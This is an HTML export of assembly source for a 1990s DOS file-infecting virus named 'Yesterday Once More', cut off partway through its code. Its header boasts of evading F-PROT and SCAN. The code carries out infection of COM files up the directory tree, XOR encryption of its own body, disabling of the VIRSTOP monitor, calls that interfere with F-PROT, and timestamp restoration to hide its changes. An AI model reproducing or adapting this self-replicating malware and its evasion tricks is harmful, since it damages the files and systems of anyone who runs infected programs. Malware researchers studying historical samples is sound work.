<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;       YESTERDAY ONCE MORE</span><span class="sc0">

</span><span class="sc1">;       Thanks for Adenine (F-PROT screwing code taken from "Uracil")</span><span class="sc0">

</span><span class="sc1">;       Thanks also go for several other people for helping me in</span><span class="sc0">
</span><span class="sc1">;       several ways..</span><span class="sc0">

</span><span class="sc1">;       Author          : pepper (my first non-overwriting virus!)</span><span class="sc0">
</span><span class="sc1">;       Manufactured in : Finland</span><span class="sc0">
</span><span class="sc1">;       Length          : 529 bytes (YOM.COM = 534bytes, but decrease</span><span class="sc0">
</span><span class="sc1">;                                    5 bytes [mov ax, 4c00h, int 21h])</span><span class="sc0">
</span><span class="sc1">;       Date            : 01-April-94    </span><span class="sc0">
 
</span><span class="sc1">;       Detection       : F-PROT 2.11 doesn't detect this anyhow,</span><span class="sc0">
</span><span class="sc1">;                         with secure or heuristics scan...</span><span class="sc0">
</span><span class="sc1">;                         SCAN 1.13 won't also detect this..</span><span class="sc0">
 
</span><span class="sc1">;       Information     : *256 different forms of mutation. All the texts</span><span class="sc0">
</span><span class="sc1">;                          and some parts of code are mutated. Number #00</span><span class="sc0">
</span><span class="sc1">;                          of mutations is the unmutated virus.     </span><span class="sc0">
</span><span class="sc1">;                         *Infects COM-files, within the length of 123-63999</span><span class="sc0">
</span><span class="sc1">;                         bytes. Doesn't infect command.com.</span><span class="sc0">
</span><span class="sc1">;                         *Uses dotdot-method. Infects 2 files from every</span><span class="sc0">
</span><span class="sc1">;                         directory from current one to root directory.</span><span class="sc0">
</span><span class="sc1">;                         *Checks for previous infection </span><span class="sc0">
</span><span class="sc1">;                         *Restores date and time stamps</span><span class="sc0">
</span><span class="sc1">;                         *Deinits VIRSTOP</span><span class="sc0">
</span><span class="sc1">;                         *Screws F-PROT</span><span class="sc0">
</span><span class="sc1">;                         *Displays 'yesterday once more' every 128th time   </span><span class="sc0">
</span><span class="sc1">;                          run and backs up clock by one day...</span><span class="sc0">
</span><span class="sc1">;                         *NOP's are because of that stupid scan thought</span><span class="sc0">
</span><span class="sc1">;                          that this was [Beta] virus.. wellwell..</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
 
        </span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">TINY</span><span class="sc0">
        </span><span class="sc9">.CODE</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">@code</span><span class="sc1">;ds:@code;es:@code</span><span class="sc0">

</span><span class="sc5">duuh</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">; jmp to label BEGIN</span><span class="sc0">


</span><span class="sc5">OrigProg</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c00h</span><span class="sc0">       </span><span class="sc1">; original proggie, which</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; returns to dos</span><span class="sc0">


</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next</span><span class="sc0">                            </span><span class="sc1">; find delta offset</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decrypt</span><span class="sc0">                         </span><span class="sc1">; decrypt virus in</span><span class="sc0">
                                                </span><span class="sc1">; memory</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4653h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2fh</span><span class="sc0">                         </span><span class="sc1">; un-install Virstop..</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">                         </span><span class="sc1">; function 1A= Set DTA</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newDTA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; set new dta ds:dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">047h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dirstring</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">                            </span><span class="sc1">; Get current directory</span><span class="sc0">


</span><span class="sc5">traverse_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">loopx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_spec</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; filename points to *.COM</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">                          </span><span class="sc1">; find and infect files</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">toparent</span><span class="sc0">                        </span><span class="sc1">; return to ..</span><span class="sc0">
                                                </span><span class="sc1">; returns CF if no '..' found</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">loopx</span><span class="sc0">                               </span><span class="sc1">; do this until in root dir</span><span class="sc0">

</span><span class="sc5">infect_End</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">OrigProg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;Copy original bytes to...</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempShit</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; TempShit = '\'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">092d</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03bh</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempshit</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">                            </span><span class="sc1">;Return to original directory</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFEh</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setdate</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">ToParent</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03bh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dotdot</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">                            </span><span class="sc1">; change dir to '..'</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Tempones</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                       </span><span class="sc1">; open file for R/W</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">newDTA</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; DTA ofs 30 = filename</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; file handle to BX</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">readbuffer</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Read 5 bytes from file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; to READBUFFER</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                       </span><span class="sc1">; move file pointer to</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; end of the file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; Return new position -&gt; AX</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">                        </span><span class="sc1">; Only 'archive' files</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">                         </span><span class="sc1">; Find First File</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">

</span><span class="sc5">findfirstnext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">bye</span><span class="sc0">                               </span><span class="sc1">; jump if carry flag</span><span class="sc0">
                                                </span><span class="sc1">; (CF = ERROR!)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Tempones</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">checks</span><span class="sc0">
</span><span class="sc5">backfromcheck</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                         </span><span class="sc1">; save 5 bytes from READ-</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">                         </span><span class="sc1">; BUFFER to the begin of file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">readbuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; write 5 bytes</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypt_val</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                         </span><span class="sc1">; Copy virus code to the end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">begin</span><span class="sc0">                  </span><span class="sc1">; of the file...............</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; cx = byte count,</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; ds:dx = user buffer</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decrypt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; Move file pointer to the</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; beginning of the file...</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; ........................</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewDta</span><span class="sc4">+</span><span class="sc2">01Ah</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">readbuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">readbuffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">readbuffer</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                         </span><span class="sc1">; Write jump code to the begin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                           </span><span class="sc1">; of the file...............</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">readbuffer</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; cx = byte count,</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; ds:dx = user buffer</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">numinfected</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Increase 'infected' counter</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newdta</span><span class="sc4">+</span><span class="sc2">016h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; set time</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newdta</span><span class="sc4">+</span><span class="sc2">018h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; set date</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">                            </span><span class="sc1">; reset file time'n date.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                         </span><span class="sc1">; Close File</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">numinfected</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">bye</span><span class="sc0">                             </span><span class="sc1">; jump if above or equal</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                         </span><span class="sc1">; No, So Find Another File</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">findfirstnext</span><span class="sc0">

</span><span class="sc5">bye</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">close2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">encrypt_val</span><span class="sc4">]</span><span class="sc0">

     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempshit</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_spec</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
     </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_spec</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">xor_loop</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">lodsb</span><span class="sc0">                 </span><span class="sc1">; DS:[SI] -&gt; AL</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
     </span><span class="sc6">stosb</span><span class="sc0">                 </span><span class="sc1">; AL -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
     </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">xor_loop</span><span class="sc0">
     </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">encrypt_val</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">numinfected</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; Number Of Files Infected</span><span class="sc0">
</span><span class="sc5">DotDot</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;ENCRYPTED AREA BEGIN</span><span class="sc0">

</span><span class="sc5">com_spec</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; COM Filespec</span><span class="sc0">

</span><span class="sc5">SetDate</span><span class="sc4">:</span><span class="sc0">
